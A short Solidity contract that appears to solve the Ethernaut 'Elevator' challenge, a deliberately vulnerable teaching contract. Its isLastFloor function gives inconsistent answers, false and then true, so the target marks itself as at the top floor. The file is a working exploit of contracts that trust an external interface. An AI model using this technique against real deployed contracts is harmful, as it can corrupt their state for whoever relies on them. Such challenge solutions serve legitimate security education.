// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
  bool private returnedOnce = false;
  Elevator public target;

  constructor(address _target) {
    target = Elevator(_target);
  }

  function isLastFloor(uint) external override returns (bool) {
    // Return false the first time, true the second
    if (!returnedOnce) {
      returnedOnce = true;
      return false;
    } else {
      return true;
    }
  }

  function attack(uint _floor) external {
    target.goTo(_floor);
  }
}
